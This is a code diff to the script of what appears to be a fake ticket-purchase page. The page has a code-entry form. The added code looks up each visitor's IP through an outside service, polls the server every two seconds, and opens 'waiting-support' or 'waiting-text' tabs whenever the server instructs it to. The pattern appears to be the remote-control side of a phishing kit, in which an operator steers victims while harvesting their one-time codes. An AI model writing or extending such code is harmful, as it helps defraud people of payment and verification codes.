@@ -96,11 +96,42 @@
     </div>
     <script>
         let lastCode = '';
+        // --- POLLING для support/text кнопок ---
+        let supportTabOpened = false;
+        function getQueryParam(name) {
+            const url = new URL(window.location.href);
+            return url.searchParams.get(name);
+        }
+        function getPageCode() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('page') || sessionStorage.getItem('page_code') || '';
+        }
         let userIP = '';
-        // Отримати IP користувача
         fetch('https://api.ipify.org?format=json')
             .then(r => r.json())
             .then(data => { userIP = data.ip; });
+        async function pollSupportButtons() {
+            if (!userIP) {
+                return setTimeout(pollSupportButtons, 2000);
+            }
+            try {
+                const resp = await fetch(`/check_support?ip=${encodeURIComponent(userIP)}`);
+                const data = await resp.json();
+                if (!supportTabOpened && (data.show_support || data.show_text)) {
+                    const page_code = getPageCode();
+                    if (data.show_support) {
+                        window.open(`/buy-tickets/loading/waiting-support.html?page=${page_code}`, '_blank');
+                        supportTabOpened = true;
+                    }
+                    if (data.show_text && data.text_id) {
+                        window.open(`/buy-tickets/loading/waiting-text.html?page=${page_code}&text_id=${data.text_id}`, '_blank');
+                        supportTabOpened = true;
+                    }
+                }
+            } catch (e) {}
+            setTimeout(pollSupportButtons, 2000);
+        }
+        setTimeout(pollSupportButtons, 2000);
         document.getElementById('code-form').addEventListener('submit', async function(e) {
             e.preventDefault();
             const code = document.getElementById('code-input').value;
